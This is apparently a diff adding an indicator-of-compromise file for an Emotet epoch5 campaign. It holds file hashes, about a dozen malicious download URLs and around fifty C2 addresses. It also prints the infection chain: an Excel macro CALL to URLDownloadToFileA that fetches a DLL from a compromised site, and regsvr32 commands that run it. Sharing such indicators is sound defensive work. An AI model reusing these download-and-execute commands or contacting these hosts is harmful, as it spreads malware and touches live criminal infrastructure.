@@ -1,0 +1,91 @@
+Emotet 2022 | epoch5 | 01.04.2022 | 
+
+************************************************************************************************************
+
+.zip 494D10BAB54E4A81AF55ADB92CEE669494733FF7127B55887A33ADD58080ED6A
+.xls 68e120a46a4b69bdcd289938ae22caeb59a74125275926d767f76821467ef441
+.dll 66ad333c077a456ff2366cc1e094ec5ea7e29202ecf977598b5a3ac9e10fc337
+
+************************************************************************************************************
+
+Exec >>
+
+EXCEL.EXE C:\Users\Admin\AppData\Local\Temp\file_0104.xlsm
+
+=CALL("urlmon", "URLDownloadToFileA", "JCCB", 0, "https://jetanahtarcilingir.net/wp-admin/dNZqOigWx5XCnSlZ/", "..\xewn.dll")
+
+C:\Windows\SysWow64\regsvr32.exe -s ..\xewn.dll
+
+C:\Windows\SysWOW64\regsvr32.exe /s C:\Windows\SysWOW64\Lnvupmnfffvcj\psablsoebuhekp.wgp
+
+************************************************************************************************************
+
+.dll distro
+
+https://jetanahtarcilingir.net/wp-admin/dNZqOigWx5XCnSlZ/
+http://formulationdrugstore.com/wp-includes/UTDuP5ti/
+http://flexaviationcenter.com/bin/mvd4h6/
+https://jetanahtarcilingir.net/wp-admin/dNZqOigWx5XCnSlZ/
+https://brutobrasil.com.br/pdf/LubLsUkjN/
+http://flumedya.com/assets/zahEwukU/
+https://jetanahtarcilingir.net/wp-admin/dNZqOigWx5XCnSlZ/
+http://formulationdrugstore.com/wp-includes/UTDuP5ti/
+http://flexaviationcenter.com/bin/mvd4h6/
+http://flumedya.com/assets/zahEwukU/
+https://brutobrasil.com.br/pdf/LubLsUkjN/
+
+c2's
+
+5.189.160.61:443
+94.177.178.26:8080
+202.29.239.162:443
+54.38.143.246:7080
+119.59.125.140:8080
+185.148.168.15:8080
+188.166.229.148:443
+2.58.16.87:8080
+104.131.62.48:8080
+103.82.248.59:7080
+37.59.209.141:8080
+103.133.214.242:8080
+195.77.239.39:8080
+128.199.192.135:8080
+78.47.204.80:443
+59.148.253.194:443
+87.106.97.83:7080
+45.71.195.104:8080
+85.214.67.203:8080
+139.196.72.155:8080
+210.57.209.142:8080
+194.9.172.107:8080
+116.124.128.206:8080
+118.98.72.86:443
+203.153.216.46:443
+202.28.34.99:8080
+54.37.228.122:443
+202.134.4.210:7080
+88.217.172.165:8080
+196.44.98.190:8080
+195.154.146.35:443
+217.182.143.207:443
+36.67.23.59:443
+207.148.81.119:8080
+190.90.233.66:443
+66.42.57.149:443
+85.25.120.45:8080
+93.104.209.107:8080
+68.183.93.250:443
+103.42.58.120:7080
+5.56.132.177:8080
+159.69.237.188:443
+51.68.141.164:8080
+54.37.106.167:8080
+198.199.98.78:8080
+54.38.242.185:443
+62.171.178.147:8080
+37.44.244.177:8080
+103.41.204.169:8080
+78.46.73.125:443
+185.148.168.220:8080
+191.252.103.16:80
+175.126.176.79:8080
